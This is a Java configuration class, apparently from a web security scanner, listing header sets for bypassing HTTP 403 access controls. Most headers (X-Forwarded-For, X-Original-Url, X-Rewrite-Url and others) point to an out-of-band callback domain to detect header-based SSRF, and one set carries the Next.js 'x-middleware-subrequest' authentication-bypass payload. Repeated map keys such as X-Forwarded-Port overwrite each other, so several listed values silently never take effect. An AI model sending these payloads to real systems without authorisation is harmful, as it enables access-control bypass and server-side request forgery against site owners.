package demo.config;

import java.util.*;

// KnownTestSets.java (新文件)
public class KnownTestSets {
    public static class TestSet {
        private final String name;
        private final Map<String, String> headers;

        public TestSet(String name, Map<String, String> headers) {
            this.name = name;
            this.headers = Collections.unmodifiableMap(headers);
        }

        public String getName() {
            return name;
        }

        public Map<String, String> getHeaders() {
            return headers;
        }
    }

    public static final List<TestSet> TEST_SETS = Collections.unmodifiableList(Arrays.asList(
            new TestSet("403bypaasA", new HashMap<String, String>() {{
                put("Base-Url", "{hash}.knowtest.abga5.wi11.fun");
                put("Client-IP", "{hash}.knowtest.abga5.wi11.fun");
                put("Http-Url", "{hash}.knowtest.abga5.wi11.fun");
                put("Proxy-Host", "{hash}.knowtest.abga5.wi11.fun");
                put("Proxy-Url", "{hash}.knowtest.abga5.wi11.fun");
                put("Real-Ip", "{hash}.knowtest.abga5.wi11.fun");
                put("Redirect", "{hash}.knowtest.abga5.wi11.fun");
                put("Referer", "{hash}.knowtest.abga5.wi11.fun");
                put("Referrer", "{hash}.knowtest.abga5.wi11.fun");
                put("Refferer", "{hash}.knowtest.abga5.wi11.fun");
                put("Request-Uri", "{hash}.knowtest.abga5.wi11.fun");
                put("Uri", "{hash}.knowtest.abga5.wi11.fun");
                put("Url", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Client-IP", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Custom-IP-Authorization", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forward-For", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forwarded-By", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forwarded-For-Original", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forwarded-For", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forwarded-Host", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forwarded-Port", "443");
                put("X-Forwarded-Port", "4443");
                put("X-Forwarded-Port", "80");
            }}),
            new TestSet("403bypaasB", new HashMap<String, String>() {{
                put("X-Forwarded-Port", "8080");
                put("X-Forwarded-Port", "8443");
                put("X-Forwarded-Scheme", "http");
                put("X-Forwarded-Scheme", "https");
                put("X-Forwarded-Server", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Forwarded", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Host", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Http-Destinationurl", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Http-Host-Override", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Original-Remote-Addr", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Originating-IP", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Proxy-Url", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Real-Ip", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Remote-Addr", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Remote-IP", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Rewrite-Url", "{hash}.knowtest.abga5.wi11.fun");
                put("X-True-IP", "{hash}.knowtest.abga5.wi11.fun");
            }}),
            new TestSet("403bypaasB", new HashMap<String, String>() {{
                put("X-Forwarder-For", "{hash}.knowtest.abga5.wi11.fun");
                put("X-Original-Url", "{hash}.knowtest.abga5.wi11.fun");
            }}),
            new TestSet("next js bypaas", new HashMap<String, String>() {{
                put("x-middleware-subrequest", "middleware:middleware:middleware:middleware:middleware");
            }})


            // 可以继续添加更多测试集 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
    ));
}